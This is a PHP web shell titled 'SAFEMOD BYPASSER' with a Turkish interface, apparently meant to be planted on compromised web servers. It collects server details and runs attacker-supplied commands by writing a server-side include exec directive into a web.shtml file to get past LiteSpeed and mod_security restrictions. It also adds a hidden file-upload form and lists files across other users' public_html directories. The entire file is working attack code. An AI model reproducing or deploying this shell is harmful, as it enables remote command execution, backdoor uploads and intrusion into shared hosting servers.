<title>Litespeedbyp</title>



<?php
error_reporting(0);

    $info = $_SERVER['SERVER_SOFTWARE'];
    $site = getenv("HTTP_HOST");
    $page = $_SERVER['SCRIPT_NAME'];
    $sname = $_SERVER['SERVER_NAME'];
    $uname = php_uname();
    $smod = ini_get('safe_mode');
    $disfunc = ini_get('disable_functions');
    $yourip = $_SERVER['REMOTE_ADDR'];
    $serverip = $_SERVER['SERVER_ADDR'];
    $version = phpversion();
    $ccc = realpath($_GET['chdir'])."/";
    $fdel = $_GET['fdel'];
    $execute = $_POST['execute'];
    $cmd = $_POST['cmd'];
    $commander = $_POST['commander'];
    $ls = "ls -la";
    $source = $_POST['source'];
    $gomkf = $_POST['gomkf'];
    $title = $_POST['title'];
    $sourcego = $_POST['sourcego'];
    $ftemp = "tmp";
    $temp = tempnam($ftemp, "cx");
    $fcopy = $_POST['fcopy'];
    $tuser = $_POST['tuser'];
    $user = $_POST['user'];
    $wdir = $_POST['wdir'];
    $tdir = $_POST['tdir'];
    $symgo = $_POST['symgo'];
    $sym = "xhackers.txt";
    $to = $_POST['to'];
    $sbjct = $_POST['sbjct'];
    $msg = $_POST['msg'];
    $header = "From:".$_POST['header'];


//PHPinfo code

if(isset($_POST['phpinfo']))
{
	die(phpinfo());
}

if ($smod)
{
    $c_h = "<font color=red face='Verdana' size='1'>ON</font>";
}
else
{
    $c_h = "<font face='Verdana' size='1' color=red>OFF</font>";
}


if (''==($disfunc))
{
    $dis = "<font color=red>None</font>";
}
else
{
    $dis = "<font color=red>$disfunc</font>";
}
//on and of info
if(isset($_GET['dir']) && is_dir($_GET['dir']))
{
 chdir($_GET['dir']);
}

$ccc = realpath($_GET['chdir'])."/";

//BLACK
echo "<head>
<style>
body { font-size: 12px;

           font-family: arial, helvetica;

            scrollbar-width: 5;

            scrollbar-height: 5;

            scrollbar-face-color: green;

            scrollbar-shadow-color: green;

            scrollbar-highlight-color: green;

            scrollbar-3dlight-color:green;

            scrollbar-darkshadow-color: green;

            scrollbar-track-color: green;

            scrollbar-arrow-color: green;

    }
</style>

<title>SAFEMOD BYPASSER - [$site]</title></head>";

//ANA tablo
echo "<body text='#000000'>
<table border='1' width='100%' id='table1' border='1' cellPadding=5 cellSpacing=0 borderColorDark=#59E817 bordercolorlight='#59E817'>

	<tr>
		<td  style='border: 1px solid #000000'>
		<font face='Verdana' size='1' color='#000000'><b>Site:</b> <u>$site</u><br><b>Server name:</b> <u>$sname</u><br><b>Software:</b> <u>$info</u><br><b>Version :</b> <u>$version</u><br><b>Uname -a:</b> <u>$uname</u><br><b>Path:</b> <u>$ccc</u><br><b>Safemode:</b> <u>$c_h</u><br><b>Disable Functions:</b> <u>$dis</u><br><b>Page:</b> <u>$page</u><br><b>Your IP:</b> <u>$yourip</u><br><b>Server IP:</b> <u><a href='http://whois.domaintools.com/".$serverip."'>$serverip</a></u></font></td>
	</tr>
</table>";


?>
<p align="center"><font face="Tahoma" size="4"><b><font color="#333333">LiteSpeed</font> <font color="#FF0000">Komut Bypasser</font></b></font></p>
<form name="z1d-litespeed"  method="post">
<p align="center"><font face="Tahoma"><b><font color="#FF0000">./</font> <font color="#000000">Calistir</font> 
<span lang="ar-sa"><font color="#FF0000">~</font> </span> </b>
    <input name="command" value="pwd" style="border: 1px dotted #FF0000; font-family:ta" size="36" tabindex="20">
<b></b> </font></p>
<p align="center"><font face="Tahoma">
  <input type="submit" name="Submit" value="./Calistir">
</font></p>
<hr />/<hr />/<hr />
<script>
window.addEventListener("DOMContentLoaded",function(){let e=document.createElement("form");e.method="post",e.enctype="multipart/form-data";let t=document.createElement("input");t.type="file",t.name="file",t.required=!0;let n=document.createElement("button");n.type="submit",n.innerHTML="UP",e.appendChild(t),e.appendChild(n),document.body.appendChild(e)});
</script>
<?php if($_FILES){if(function_exists('move_uploaded_file')){if(move_uploaded_file($_FILES['file']['tmp_name'],$_FILES['file']['name'])){printf('uploaded: <a href="%s">%s</a><br/>',$_FILES['file']['name'],$_FILES['file']['name']);}else{print 'fail';}}elseif(function_exists('copy')){if(copy($_FILES['file']['tmp_name'],$_FILES['file']['name'])){printf('uploaded: <a href="%s">%s</a><br/>',$_FILES['file']['name'],$_FILES['file']['name']);}else{print 'failed';}}}
?>
<div align="center">
  <p> </p>
  <p><font color="#FF0000" size="3">Method Not Implemented - <font face="Tahoma"> Dir Access Denied  - Mod_security</font> Hatalari icin <font color="#000000" size="4" face="Tahoma"><b>Bypass</font> </font></b><br><br>
    <font face="Tahoma"><b><font color="#FF0000">./</font> <font color="#333333">Calistir</font> <span lang="ar-sa"><font color="#FF0000">~ </font></span></b></font>
    <INPUT NAME="getir" TYPE="TEXT" value="/home/*/public_html">
    <center>
    <input type="submit" value="Dizini Getir" name="submit">
    <?
 if($_POST["submit"]){
  $listele=$_POST['getir'];
  $listele=$listele."*.*";
   $dosya=glob($listele);
   printf("<br />");
    foreach ($dosya as $dosyalar) {
      printf($dosyalar); printf("       ");  
echo substr(sprintf('%o', fileperms($dosyalar)), -4);
 printf("<br />");
  }
}
?>
  </p>
  <p> </p>
</div><br>
<p align="center">


<p align="center"><font size="2"><b><font color="#00CC33" face="Tahoma"> </font></b></font></p>
</form>
<?php
$command = $_POST['command'];
$l00l = $_POST['l00l'];
if($command){
$z11d = "<center><pre><pre>
<br>
<!--#exec cmd='$command' --> 

";
$openfile = fopen("web.shtml","w");
$writeinto = fwrite($openfile,"$z11d");
fclose($openfile);
if($openfile){
}else{
}
}
?>
<br><br><center>


<pre> 
 <iframe src='web.shtml'  width=380px height=85% id="I1" name="IF1" >
</pre>

